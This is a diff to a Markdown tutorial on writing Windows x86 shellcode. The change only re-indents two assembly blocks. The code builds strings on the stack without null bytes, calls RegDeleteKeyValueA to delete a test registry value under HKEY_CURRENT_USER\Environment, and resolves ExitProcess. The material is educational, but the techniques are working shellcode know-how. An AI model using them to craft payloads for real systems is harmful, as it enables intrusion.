@@ -196,48 +196,48 @@ In this code fragment, similarly to the previous examples, the string is placed 
 ### Pushing the main parameters of a function onto the stack
 
 ```
-			add esp, 0x14; Cleanup stack
-			push 0x616C6156; Vala
-			sub dword ptr[esp + 0x3], 0x61; Remove "a"
-			push 0x74736554; Test
-			mov ecx, 0x61746E65; enta
-			push ecx
-			sub dword ptr[esp + 0x3], 0x61; Remove "a"
-			push 0x6D6E6F72; ronm
-			push 0x69766E45; Envi
-			xor ecx, ecx
-			mov ecx, esp
-			add ecx, 0x0C
-			push ecx; Environment
-			xor ecx, ecx
-			mov ecx, esp
-			add ecx, 0x04
-			push ecx; TestVal
-			xor ecx, ecx
-			mov ecx, 0x81FFFF02
-			sub ecx, 0x01FFFF01 
-			push ecx; HKEY_CURRENT_USER
-			call eax; RegDeleteKeyValueA!
+add esp, 0x14; Cleanup stack
+push 0x616C6156; Vala
+sub dword ptr[esp + 0x3], 0x61; Remove "a"
+push 0x74736554; Test
+mov ecx, 0x61746E65; enta
+push ecx
+sub dword ptr[esp + 0x3], 0x61; Remove "a"
+push 0x6D6E6F72; ronm
+push 0x69766E45; Envi
+xor ecx, ecx
+mov ecx, esp
+add ecx, 0x0C
+push ecx; Environment
+xor ecx, ecx
+mov ecx, esp
+add ecx, 0x04
+push ecx; TestVal
+xor ecx, ecx
+mov ecx, 0x81FFFF02
+sub ecx, 0x01FFFF01 
+push ecx; HKEY_CURRENT_USER
+call eax; RegDeleteKeyValueA!
 ```
      
    Pushing onto the stack is similar, but special attention should be paid to the HKEY_CURRENT_USER constant, which is equal to 0x80000001. To get it, 0x81FFFF02 was initially placed in ecx, and then the number 0x01FFFF01 was subtracted. The conversion data was done in order to avoid null bytes.
    
 In order to correctly exit the process, you need to find the ExitProcess function in kernel32.dll.
 ```
-			add esp, 0x1C; Clean stack
-			pop edx; GetProcAddress
-			pop ebx; kernel32.dll base address
-			mov ecx, 0x61737365; essa
-			push ecx
-			sub dword ptr[esp + 0x3], 0x61; Remove "a"
-			push 0x636f7250; Proc
-			push 0x74697845; Exit
-			push esp
-			push ebx; kernel32.dll base address
-			call edx; GetProc(Exec)
-			xor ecx, ecx; ECX = 0
-			push ecx; Return code = 0
-			call eax; ExitProcess
+add esp, 0x1C; Clean stack
+pop edx; GetProcAddress
+pop ebx; kernel32.dll base address
+mov ecx, 0x61737365; essa
+push ecx
+sub dword ptr[esp + 0x3], 0x61; Remove "a"
+push 0x636f7250; Proc
+push 0x74697845; Exit
+push esp
+push ebx; kernel32.dll base address
+call edx; GetProc(Exec)
+xor ecx, ecx; ECX = 0
+push ecx; Return code = 0
+call eax; ExitProcess
 ```
 ### Shell code in byte form
 
